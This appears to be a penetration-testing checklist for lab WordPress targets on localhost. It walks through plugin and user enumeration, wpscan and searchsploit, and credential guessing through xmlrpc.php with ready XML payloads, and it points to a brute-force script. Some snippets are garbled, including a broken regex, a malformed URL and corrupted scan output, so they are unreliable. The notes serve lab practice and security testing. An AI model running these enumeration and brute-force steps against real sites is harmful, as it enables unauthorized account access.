# Prerequisites

> [!success] Prerequisites
>
> - [ ] Register for a WpScan API Token in `$WPSCAN_API_TOKEN`

# Enumeration
- [ ] Get plugins
```bash
curl -s -X GET "http://$target:80/" | grep -oP 'plugins/\K[^/]+' | sort -u 
```

- [ ] Check for `wp-admin/` on the search bar

  ```bash
  localhost:31337/wp-admin/
  ```

- [ ] Check the web, click blog entries and check if you find other users

  ```bash
  localhost:31337/?author=1
  ```

- [ ] Enumerate if a known user is valid by attempting to log in the web panel.

- [ ] Search for exploits in [[exploit-db]] by using `searchsploit`
  ```bash
  searchsploit wordpress user enumeration
  ```

- [ ] Try find a exploit using `searchsploit`the
  ```bash
  searchsploit wordpress user enumeration
  ```

- [ ] Check `/wp-json/wp/v2/users/` if it's vulnerable

- [ ] Check `localhost:31337/wp-content/plugins` for directory listing

- [ ] Enumerate plugins manually
  ```bash
  curl -s -X GET "http://localhost:31337" |
  	grep -oP 'plugins/\K[^/]+]' | sort -u
  ```

- [ ] Run `wpscan` to try find vulnerabilities

  ```
  wpscan --url http//127.0.0.1:31337 --api-token=$WPSCAN_API

  [+] social-warfare
   | Location: http://<addr>/wp-content/Rlugins/social-warfare/
   | Last Updated: 2021-J07-20116:09:00.000z
   | [!] The version is out of date, the latest version is 4.3.0
  ```

- [ ] Check `xmplrpc.php`. If it exists could be used for credential discovery.
  ```bash
  curl -s -X POST "http://localhost:31337/xmlrpc.php"
  ```

- [ ] Try [exploiting `xmlrpc.php` on WordPress](https://nitesculucian.github.io/2019/07/02/exploiting-the-xmlrpc-php-on-all-wordpress-versions/))

  Create a `file.xml` file

  ```xml
  <?xml version="1.0" encoding="utf-8"?>
  <methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
  </methodCall>
  ```

  Send it via POST

  ```bash
  curl -s -X POST "http://localhost:31337/xmlrpc.php" -d@file.xml |
  	grep 'wp.getUsersBlogs'
  ```

  Enumerate credentials
  ```xml
  <?xml version="1.0" encoding="utf-8"?>
  <methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
  <param><value>username</value></param>
  <param><value>password</value></param>
  </params>
  </methodCall>
  ```

  Send it

  ```bash
  curl -s -X POST "http://localhost:31337/xmlrpc.php" -d@file.xml |
  	cat -l xml
  ```

  Now create a [[xmlrpcBruteforce.sh]] to attempt to find the password.
